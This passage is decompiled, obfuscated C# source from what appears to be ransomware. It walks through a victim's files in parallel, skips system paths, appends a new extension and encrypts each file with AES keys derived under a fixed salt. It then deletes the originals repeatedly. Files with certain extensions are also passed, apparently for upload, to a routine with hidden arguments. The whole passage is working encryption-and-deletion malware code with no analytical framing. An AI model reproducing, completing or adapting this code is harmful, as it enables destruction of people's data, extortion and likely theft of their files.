								CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = zPoLbQDPrHj.getString_0(107401359);
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
								{
									CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
								}
								else
								{
									CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP;
								}
								if (pRibgXhmfietto == zPoLbQDPrHj.getString_0(107396834))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in tnUDcbYyevrzGRJA)
										{
											if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107396841))
											{
												if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
												{
													try
													{
														aDJKTHVvtfISh.AUzNYWrxJKEB(zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401479), zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401474), zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401429), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107396407))
											{
												try
												{
													aDJKTHVvtfISh.AUzNYWrxJKEB(zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401479), zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401474), zPoLbQDPrHj.tdXNNsWJFtDVWeIAq.getString_0(107401429), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								string text7 = WQPkeOvEci.SBPfmWOaNeINeU(32);
								string text8 = zPoLbQDPrHj.getString_0(107401359);
								text8 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : zPoLbQDPrHj.getString_0(107401359));
								string s4 = pEVoDrneEBXda.qxtPYzjMemryI(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (dhEsUcbXeBeyR == zPoLbQDPrHj.getString_0(107396400))
								{
									byte[] array2 = null;
									byte[] byte_2 = VbJxNITbKqkCPhG.KlRCrLIVmNrA(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
									if (VbJxNITbKqkCPhG.ilkRJUapRp(tRlxUGmSHDq: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? VbJxNITbKqkCPhG.QTulHfZYmae(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VbJxNITbKqkCPhG.QTulHfZYmae(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), THVIvWtEdHnQ: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, UjxCrHgnMeLgc: bytes4))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
									}
									catch (Exception)
									{
									}
								}
								else if (!UpNccIaFzBadyA)
								{
									if (WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08ba_2:;
							}
							catch (Exception)
							{
								goto IL_1119;
							}
						}
					}
					continue;
					IL_1119:
					CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.aGPipPUJxaM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new zPoLbQDPrHj.UgmkrRPmQyDLrq();
			CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
			if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401327)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401334)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401301)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401252)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401271)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401246)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401193)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401212)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401167)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401130)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401153)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401104)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401110)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400577)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400520)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400535)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400486)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400501)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400452)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400467)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400418)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400401)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400388)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400367)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400354)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400373)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400324)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400339)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107400802))) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400777)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107397084)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400796)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400739)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400766)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400761)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400756)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400719)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(IKRtRLOSqagD))
			{
				if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
				{
					if (NgbDiBVJKDTW == zPoLbQDPrHj.getString_0(107396834))
					{
						try
						{
							if (SqYdHlCliRAG.MyilMlfEAq(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
							{
								SqYdHlCliRAG.QRVaUKMRQBopeRUy(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
							}
						}
						catch
						{
						}
					}
					JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349548) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349989) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349936));
								Console.WriteLine(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349523), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
								Console.WriteLine(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349466), VxQUKIskXHMm.Elapsed);
								Console.WriteLine(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107349959));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
					{
						IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
					}
					imzSfhQVzYADk(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					try
					{
						new lERBUhOhgv().ylvknGhZJxVcmAc(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (SidumIOOlYmWUm)
								{
									Console.WriteLine(zPoLbQDPrHj.getString_0(107349992) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349979) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + zPoLbQDPrHj.getString_0(107349926));
									Console.WriteLine(zPoLbQDPrHj.getString_0(107349949));
								}
							}
							catch
							{
							}
							HnVlWPPowq(sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349332)), zPoLbQDPrHj.getString_0(107400667) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107400667) + sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349307)) + zPoLbQDPrHj.getString_0(107400667) + Environment.UserName + zPoLbQDPrHj.getString_0(107400667) + sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349258)));
						}
					}
					catch (Exception ex2)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349233) + ex2.Message + zPoLbQDPrHj.getString_0(107395942));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349184) + ex4.Message + zPoLbQDPrHj.getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_0887_2;
						}
						if (krdgQbbXWsBnkAs == zPoLbQDPrHj.getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
								{
									if (OtvlrYHFRq)
									{
										CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
									}
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
								}
							}
							catch (Exception ex6)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349603) + ex6.Message + zPoLbQDPrHj.getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
							{
								CS_0024_003C_003E8__locals0.tDwFwsGDrP += CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
							}
							if (pRibgXhmfietto == zPoLbQDPrHj.getString_0(107396834))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in tnUDcbYyevrzGRJA)
									{
										if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107396844))
										{
											if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
											{
												try
												{
													aDJKTHVvtfISh.AUzNYWrxJKEB(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401482), zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401477), zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401432), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107396410))
										{
											try
											{
												aDJKTHVvtfISh.AUzNYWrxJKEB(zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401482), zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401477), zPoLbQDPrHj.UgmkrRPmQyDLrq.getString_0(107401432), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = WQPkeOvEci.SBPfmWOaNeINeU(32);
							string text2 = zPoLbQDPrHj.getString_0(107401359);
							text2 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : zPoLbQDPrHj.getString_0(107401359));
							string s = pEVoDrneEBXda.qxtPYzjMemryI(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dhEsUcbXeBeyR == zPoLbQDPrHj.getString_0(107396400))
							{
								byte[] array = null;
								byte[] byte_ = VbJxNITbKqkCPhG.KlRCrLIVmNrA(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
								if (!VbJxNITbKqkCPhG.ilkRJUapRp(tRlxUGmSHDq: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), THVIvWtEdHnQ: CS_0024_003C_003E8__locals0.tDwFwsGDrP, UjxCrHgnMeLgc: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UpNccIaFzBadyA)
							{
								if (!WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (OtvlrYHFRq)
							{
								CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
							}
							string text3 = WQPkeOvEci.SBPfmWOaNeINeU(32);
							string text4 = zPoLbQDPrHj.getString_0(107401359);
							text4 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : zPoLbQDPrHj.getString_0(107401359));
							string s2 = pEVoDrneEBXda.qxtPYzjMemryI(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
							{
								if (!NbfRNVirWcO)
								{
									if (!UpNccIaFzBadyA)
									{
										gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
									}
									else
									{
										gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!UpNccIaFzBadyA)
										{
											bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
										}
										else
										{
											bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SWaMdrdKGgzowGl)
										{
											try
											{
												File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398290) + ex11.Message + zPoLbQDPrHj.getString_0(107395942));
											}
											catch (Exception)
											{
											}
										}
										ZzaknwGiCeEd++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398299), nQCMwcWKyQk);
								}
								else
								{
									gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398299), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398290) + ex14.Message + zPoLbQDPrHj.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									return;
								}
							}
							if (UpNccIaFzBadyA)
							{
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
								{
									VbClOPiwZbe(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes2);
								}
								else
								{
									VbClOPiwZbe(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		});
	}

	private static void yRafPGvxSkX(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pRibgXhmfietto == getString_0(107396816))
					{
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396816))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396382))
							{
								try
								{
									aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107398281)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107398281), getString_0(107401341)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void bgAiWEPrFUh(string LtvKgfEVcSogMP, string qJpyoyVReBm, byte[] RJNJFFgWFahM, byte[] ABDTpiKMipMNp = null)
	{
		try
		{
			if (pRibgXhmfietto == getString_0(107396816))
			{
				FileStream fileStream = new FileStream(LtvKgfEVcSogMP, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (LtvKgfEVcSogMP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396816))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), LtvKgfEVcSogMP);
							}
							catch
							{
							}
						}
					}
					else if (LtvKgfEVcSogMP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396382))
					{
						try
						{
